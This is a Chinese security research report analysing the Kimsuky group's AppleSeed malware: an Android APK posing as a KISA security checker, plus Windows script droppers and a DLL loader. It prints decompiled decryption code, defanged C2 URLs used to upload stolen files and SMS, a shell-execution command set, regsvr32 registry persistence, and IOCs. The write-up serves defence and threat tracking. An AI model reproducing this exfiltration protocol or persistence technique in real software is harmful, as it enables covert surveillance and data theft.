> 原文链接: https://www.anquanke.com//post/id/241091 


# Kimsuky APT组织使用新型的AppleSeed Android组件伪装成安全软件对韩特定目标进行攻击


                                阅读量   
                                **222858**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t017a5ca17f4f636f0d.png)](https://p1.ssl.qhimg.com/t017a5ca17f4f636f0d.png)



```
本文一共2922字,36张图 预计阅读时间13分钟
```

## 一.前言:

`kimsuky` APT组织(又名**Mystery Baby, Baby Coin, Smoke Screen, BabyShark, Cobra Venom**) ,该组织一直针对于韩国的智囊团,政府组织,新闻组织,大学教授等等进行活动.并且该组织拥有`windows`平台的攻击能力,载荷便捷,阶段繁多。并且该组织十分活跃.其载荷有**带有漏洞的hwp文件,携带恶意宏文档,释放dll载荷的PE文件,远程模板注入技术docx文档,恶意的wsf以及js的脚本文件**等

近日,`Gcow`安全团队**追影小组**在日常的文件监控中发现该组织正在积极的使用**分阶段的恶意宏文档**,**恶意的wsf以及js文件释放并加载载荷同时释放并打开相关的诱饵文档以迷惑受害者**以及**部分模板注入技术**的相关样本。同时我们也发现了其使用**冒充KISA(Korea Internet &amp; Security Agency)的官方安卓端安全检查软件针对特定目标进行钓鱼的活动**,**同时根据我们的分析发现其APK载荷与该组织之前一直在使用的AppleSeed(又名AutoUpdate)组件有很强的关联性**,**所以我们猜测该APK属于AppleSeed组件集下的Android攻击载荷。**

故此我们判断该组织已经具有了`Windows`,`MacOs`,`Android`的攻击能力,并且将在未来的一段时期持续的活跃。



## 二.样本分析:

该恶意APP伪装成KISA的安卓端安全检查软件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013c65b14bbb0c1db2.png)

运行之后申请相关的权限,弹出界面以迷惑受害者：

[![](https://p4.ssl.qhimg.com/t019ba87267d51267b9.png)](https://p4.ssl.qhimg.com/t019ba87267d51267b9.png)

在 `LaunchActivity` 的 `onCreate` 方法中，启动了 `MainService` 服务。

[![](https://p3.ssl.qhimg.com/t0154de86cbb472f974.png)](https://p3.ssl.qhimg.com/t0154de86cbb472f974.png)

MainService 中，字符串经过了加密，对关键字符串解密后，可得到上传数据的 url

解密代码如下

```
public static void decrypt(String arg10) `{`
    String v0_2;
    int v5;
    try `{`
        int v0 = arg10.length();
        int v1 = v0 / 2;
        byte[] v2 = new byte[v1];
        int v3 = 0;
        int v4;
        for(v4 = 0; true; v4 += 2) `{`
            v5 = 16;
            if(v4 &gt;= v0) `{`
                break;
            `}`

            v2[v4 / 2] = ((byte)((Character.digit(arg10.charAt(v4), v5) &lt;&lt; 4) + Character.digit(arg10.charAt(v4 + 1), v5)));
        `}`

        v1 -= v5;
        byte[] v10 = new byte[v1];
        byte[] v0_1 = new byte[v5];
        System.arraycopy(v2, 0, v0_1, 0, v5);
        v4 = 0;
        int v6;
        int v8;
        for(v6 = 0; v3 &lt; v1; v6 = v8) `{`
            if(v4 &gt;= v5) `{`
                v4 += -16;
            `}`

            int v7 = v3 + 16;
            v8 = v2[v7];
            v10[v3] = ((byte)(v6 ^ (v2[v7] ^ v0_1[v4])));
            ++v3;
            ++v4;
        `}`

        v0_2 = new String(v10, StandardCharsets.UTF_8);
    `}`
    catch(Exception e) `{`
        v0_2 = "";
    `}`
    System.out.println(v0_2);
    return;
`}`
```

hxxp://download.riseknite.life/index.php

然后把 url 传入了 c.c.a.c 方法，并使用 `scheduleAtFixedRate`设定每分钟执行一次

[![](https://p5.ssl.qhimg.com/t0130016cce13322e5b.png)](https://p5.ssl.qhimg.com/t0130016cce13322e5b.png)

在 c.c.a.c 中，并行执行了两个方法 d() 和 c.c.a.e.c()，分别查看逻辑

[![](https://p2.ssl.qhimg.com/t015bf8b06f65a333f6.png)](https://p2.ssl.qhimg.com/t015bf8b06f65a333f6.png)

d()主要是取得一些设备信息，并 POST 发送数据。

> hxxp://download.riseknite.life/index.php?m=a&amp;p1=`{`url 编码后的 android_id`}`&amp;p2=`{`设备型号 `}`+`{`SDK 版本`}`+`{`后门版本号`}`

<th style="text-align: center;">参数</th><th style="text-align: center;">值</th>
|------
<td style="text-align: center;">m</td><td style="text-align: center;">a</td>
<td style="text-align: center;">p1</td><td style="text-align: center;">url 编码后的 android_id</td>
<td style="text-align: center;">p2</td><td style="text-align: center;">设备型号 + SDK 版本 + 后门版本号</td>

[![](https://p4.ssl.qhimg.com/t010bd6e484abce1eab.png)](https://p4.ssl.qhimg.com/t010bd6e484abce1eab.png)

c.c.a.e.c() 先创建了一个临时文件 `cmd_xxxxx.dat`（以下文件不特殊说明均为临时文件,**注意:[xxxxx为五位字符数字的随机文件名]**） ，然后下载数据写入文件

> hxxp://download.riseknite.life/index.php?m=c&amp;p1=`{`url 编码后的 android_id`}`
hxxp://download.riseknite.life/index.php?m=d&amp;p1=`{`url 编码后的 android_id`}`

<th style="text-align: center;">参数</th><th style="text-align: center;">值</th>
|------
<td style="text-align: center;">m</td><td style="text-align: center;">c,d</td>
<td style="text-align: center;">p1</td><td style="text-align: center;">url 编码后的 android_id</td>
<td style="text-align: center;">返回值</td><td style="text-align: center;">文件数据</td>

[![](https://p0.ssl.qhimg.com/t01628a6d6d554e0403.png)](https://p0.ssl.qhimg.com/t01628a6d6d554e0403.png)

新建 a 对象并把刚才下载的数据传入 a 方法， a 方法中对 dat 的内容进行了解析

<th style="text-align: center;">数据</th><th style="text-align: center;">大小</th>
|------
<td style="text-align: center;">指令类型（1-8）</td><td style="text-align: center;">int</td>
<td style="text-align: center;">指令组数量</td><td style="text-align: center;">int</td>
<td style="text-align: center;">第一组指令长度</td><td style="text-align: center;">int</td>
<td style="text-align: center;">指令内容</td><td style="text-align: center;">byte[]</td>
<td style="text-align: center;">第二组指令长度</td><td style="text-align: center;">int</td>
<td style="text-align: center;">指令内容</td><td style="text-align: center;">byte[]</td>
<td style="text-align: center;">…</td><td style="text-align: center;">…</td>

[![](https://p2.ssl.qhimg.com/t019d17f0a9192130bd.png)](https://p2.ssl.qhimg.com/t019d17f0a9192130bd.png)

[![](https://p1.ssl.qhimg.com/t0196401e436b725c04.png)](https://p1.ssl.qhimg.com/t0196401e436b725c04.png)

最终调用 a.d() 方法，a.d() 会根据指令类型执行相应的操作

指令类型为 1 时，会提醒用户更新并进行更新操作

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e6c165fc03db8f23.png)

指令类型为 2 时，a.d() 创建了 `list.xls`和 `zip.dat` ，并遍历**/sdcard**目录及其子文件夹下的所有文件，把文件信息写入了 list.xls

<th style="text-align: center;">NAME</th><th style="text-align: center;">SIZE</th><th style="text-align: center;">LAST MODIFIED</th><th style="text-align: center;">PATH</th>
|------
<td style="text-align: center;">文件名</td><td style="text-align: center;">文件大小（按KB计算）</td><td style="text-align: center;">修改时间</td><td style="text-align: center;">绝对路径</td>

list.xls 经过压缩，写入 zip.dat ,并在 c.b.a.a.a.u() 中伪装了 pdf 文件头并加密内容，逃避沙箱对流量的检测

调用 c.d( url , 日期 , 文件路径 ) 上传，url 的参数如下

> hxxp://download.riseknite.life/index.php?m=b&amp;p1=`{`url 编码后的 android_id`}`&amp;p2=a

<th style="text-align: center;">参数</th><th style="text-align: center;">值</th>
|------
<td style="text-align: center;">m</td><td style="text-align: center;">b</td>
<td style="text-align: center;">p1</td><td style="text-align: center;">android_id</td>
<td style="text-align: center;">p2</td><td style="text-align: center;">a</td>

[![](https://p1.ssl.qhimg.com/t012ac2603eb0a26d5e.png)](https://p1.ssl.qhimg.com/t012ac2603eb0a26d5e.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bc05f42ab507fb58.png)

c.d() 对文件进行了分块上传，以 “” 为分隔符

[![](https://p1.ssl.qhimg.com/t0161802ba1f8a8b792.png)](https://p1.ssl.qhimg.com/t0161802ba1f8a8b792.png)

指令类型为 3 时，上传指定的文件

[![](https://p2.ssl.qhimg.com/t015cb0e90ddc017198.png)](https://p2.ssl.qhimg.com/t015cb0e90ddc017198.png)

指令类型为 4 时，使用 **“ sh -c “** 对 `cmd_xxxxx.dat` 的内容进行执行，把执行结果写入`cmd_xxxxx.txt` ,经过相同的伪装，调用 c.d() 上传

> hxxp://download.riseknite.life/index.php?m=b&amp;p1=`{`url 编码后的 android_id`}`&amp;p2=b

<th style="text-align: center;">参数</th><th style="text-align: center;">值</th>
|------
<td style="text-align: center;">m</td><td style="text-align: center;">b</td>
<td style="text-align: center;">p1</td><td style="text-align: center;">android_id</td>
<td style="text-align: center;">p2</td><td style="text-align: center;">b</td>

[![](https://p2.ssl.qhimg.com/t01252f781f91135589.png)](https://p2.ssl.qhimg.com/t01252f781f91135589.png)

指令类型为 5 时，创建 sms.txt ，调用安卓短信协议，获取信息写入 sms.txt

> 日期 类型（收到/发送） 发送/接受人手机号码 短信内容

然后伪装，上传

> hxxp://download.riseknite.life/index.php?m=b&amp;p1=`{`url 编码后的 android_id`}`&amp;p2=c

<th style="text-align: center;">参数</th><th style="text-align: center;">值</th>
|------
<td style="text-align: center;">m</td><td style="text-align: center;">b</td>
<td style="text-align: center;">p1</td><td style="text-align: center;">android_id</td>
<td style="text-align: center;">p2</td><td style="text-align: center;">c</td>

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d1eacbe38da4c69c.png)

指令类型为 6 和 7 时分别清除 app 的数据和缓存

[![](https://p5.ssl.qhimg.com/t01b1105aa66b171399.png)](https://p5.ssl.qhimg.com/t01b1105aa66b171399.png)

指令类型为 8 时，发送短信

[![](https://p4.ssl.qhimg.com/t01a032bdb338d6fffb.png)](https://p4.ssl.qhimg.com/t01a032bdb338d6fffb.png)

<th style="text-align: center;">指令id</th><th style="text-align: center;">功能</th>
|------
<td style="text-align: center;">1</td><td style="text-align: center;">提醒用户更新并进行更新操作</td>
<td style="text-align: center;">2</td><td style="text-align: center;">收集/sdcard目录下的文件的信息压缩后伪装并且上传</td>
<td style="text-align: center;">3</td><td style="text-align: center;">上传指定的文件</td>
<td style="text-align: center;">4</td><td style="text-align: center;">执行命令并将回显压缩后伪装上传</td>
<td style="text-align: center;">5</td><td style="text-align: center;">调用安卓短信协议，获取信息写入 sms.txt,伪装后发送给c2</td>
<td style="text-align: center;">6&amp;7</td><td style="text-align: center;">清除app的缓存与数据</td>
<td style="text-align: center;">8</td><td style="text-align: center;">发送短信给特定的目标</td>

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01dc1b20ff0803da3e.png)

此外我们还观察到奇安信红雨滴实验室在其推特上公开了该组织的js样本(参考链接见尾部)

[![](https://p3.ssl.qhimg.com/t01a99cb9b395a3b174.png)](https://p3.ssl.qhimg.com/t01a99cb9b395a3b174.png)

其js代码的主要功能就是将诱饵文档以及加upx的`AppleSeed`载荷写入**%ProgramData%**下,并且调用`certutil.exe`解密,然后运行诱饵文档以迷惑受害者,调用`regsvr32.exe /s`加载`AppleSeed`载荷

[![](https://p4.ssl.qhimg.com/t01402def94a495af00.png)](https://p4.ssl.qhimg.com/t01402def94a495af00.png)

其显示的诱饵文档截图如下:

[![](https://p3.ssl.qhimg.com/t0188ef8b86dc5fc5c2.png)](https://p3.ssl.qhimg.com/t0188ef8b86dc5fc5c2.png)

其话题主要关于韩国外交部海外任务服务状况的调查表。而在今年三月份的时候我们也观察到其使用wsf脚本释放相应的载荷,其相关代码与js的释放物相似,故此不再赘述,其释放的诱饵关于韩国国防部空军Wargame模型的改进计划内容以针对该国的国防工业

[![](https://p3.ssl.qhimg.com/t01d6e5f28d01a7e893.png)](https://p3.ssl.qhimg.com/t01d6e5f28d01a7e893.png)

`AppleSeed`加载器分析:

调用解密函数解密相关的字符串变量,写注册表项,创造新键以达到权限维持的效果。键名:`WindowsDefenderAutoUpdate`,键值:**regsvr32.exe /s \”C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll**

[![](https://p4.ssl.qhimg.com/t01a558485fa9694774.png)](https://p4.ssl.qhimg.com/t01a558485fa9694774.png)

获取当前文件路径并且拷贝当前文件到**C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll**

[![](https://p2.ssl.qhimg.com/t01f77c0f85751eeccb.png)](https://p2.ssl.qhimg.com/t01f77c0f85751eeccb.png)

创造名为`DropperRegsvr32-20210418013743`的互斥体并且防止其多开

[![](https://p3.ssl.qhimg.com/t0195d59c8ae0d79e2d.png)](https://p3.ssl.qhimg.com/t0195d59c8ae0d79e2d.png)

启动主要功能线程:

[![](https://p0.ssl.qhimg.com/t01670c2e2b2f1af228.png)](https://p0.ssl.qhimg.com/t01670c2e2b2f1af228.png)

主要功能线程:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012e28283052e54910.png)

获取系统所在盘符以及其所在盘符驱动器的卷标序列号,并且将其取hex后取前八位

[![](https://p4.ssl.qhimg.com/t0125604eae8a19e37d.png)](https://p4.ssl.qhimg.com/t0125604eae8a19e37d.png)

解密C2后将信息进行拼接

> onedrive-upload.ikpoo.cf/?m=c&amp;p1=`{`C盘卷标序列号`}`
onedrive-upload.ikpoo.cf/?m=d&amp;p1=`{`C盘卷标序列号`}`

[![](https://p0.ssl.qhimg.com/t01443f96eb4370abf8.png)](https://p0.ssl.qhimg.com/t01443f96eb4370abf8.png)

将其发送到C2并将回显数据写入**%temp%\xxxx.tmp**中**注意:[xxxx为前两位数字后两位字母的随机文件名]**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c75f5bf5f6a196fa.png)

收集系统信息并且进行筛选再依据格式**Win%d.%d.%d%s**进行格式化

[![](https://p2.ssl.qhimg.com/t01a48690b16d160ba0.png)](https://p2.ssl.qhimg.com/t01a48690b16d160ba0.png)

解密相关配置数据,根据形式**/?m=a&amp;p1=`{`C盘卷标序列号`}`&amp;p2=`{`系统位数名称`}`-`{`downloader名称`}`-v`{`后门版本号`}`**拼接报文格式

> onedrive-upload.ikpoo.cf/?p1=`{`C盘卷标序列号`}`&amp;p2=`{`系统位数名称`}`-D_Regsvr32-v2.0.74

[![](https://p4.ssl.qhimg.com/t01fc09cd587c92aa90.png)](https://p4.ssl.qhimg.com/t01fc09cd587c92aa90.png)

将数据包发送到c2上

[![](https://p1.ssl.qhimg.com/t01d09cc41e4c6a13d8.png)](https://p1.ssl.qhimg.com/t01d09cc41e4c6a13d8.png)



## 三.样本关联:

#### <a class="reference-link" name="1.%E6%8A%A5%E6%96%87%E7%9B%B8%E4%BC%BC%E6%80%A7"></a>1.报文相似性

其二者在报文的参数上都以**m=a&amp;p1=,m=c&amp;p1=,m=d&amp;p1=**进行相关的传参,同时其p2的第一个参数以及第三个参数分别都为所收集到的本机信息以及其后门的版本号.且p1都是根据本身的独特序列号以及id所构成的唯一认证因素,所以二者在流量报文的脚本上具有一定的相似性

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017fc9035485400571.png)

#### <a class="reference-link" name="2.%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E7%9A%84%E7%9B%B8%E4%BC%BC%E6%80%A7"></a>2.解密代码的相似性

二者的解密代码具体一定的相似性也成为二者被归因到一类恶意软件的一项重要的指标。不过由于dll使用了大量的代码流平坦化,导致解密函数的流程被严重的混淆,故此不能作为很强的归因形式.不过根据APK所提供的解密算法可以还原dll文件中的相关密文。



## 四.结语

`Kimsuky`APT组织作为东北亚地区最为活跃的`APT`组织之一,其一直在更新自己的相关武器库以及更新其载荷的植入方式不断追求逃脱杀毒软件的检测。如下图,本文提到的APK木马当其刚上传到Virustotal平台的时候,其杀软检测的状况为:0/63。该组织也成为了东北亚地区地缘政治下的网络威胁的焦点,当然这值得我们去更多关注该组织的活动,`Gcow`安全团队**追影小组**将继续跟踪该组织更多的动向。

[![](https://p4.ssl.qhimg.com/t01125722008de73615.png)](https://p4.ssl.qhimg.com/t01125722008de73615.png)



## 五.IOCs:

### <a class="reference-link" name="Script%20Dropper:"></a>Script Dropper:

3A4AB11B25961BECECE1C358029BA611(2021 외교부 재외공관 복무관련 실태 조사 설문지.hwp.js)

14B95DC99E797C6C717BF68440EAE720(창공모델 성능개량 체계개발사업 현장확인자료 – 협력업체 배포용.wsf)

### <a class="reference-link" name="AppleSeed%20Dll%20implant:"></a>AppleSeed Dll implant:

80A2BB7884B8BAD4A8E83C2CB03EE343(AutoUpdate.dll)

A03598CD616F86998DAEF034D6BE2EC5(temp.db)

### <a class="reference-link" name="AppleSeed%20Android:"></a>AppleSeed Android:

4626ED60DFC8DEAF75477BC06BD39BE7(KisaAndroidSecurity.apk)

### <a class="reference-link" name="C2:"></a>C2:

download.riseknite.life

onedrive-upload.ikpoo.cf

alps.travelmountain.ml



## 六.参考链接以及引用
- blog.alyac.co.kr/3536
- twitter.com/RedDrip7/status/1386165998709972995
- twitter.com/issuemakerslab/status/1385712773024210944
- twitter.com/unpacker/status/1377796351589642241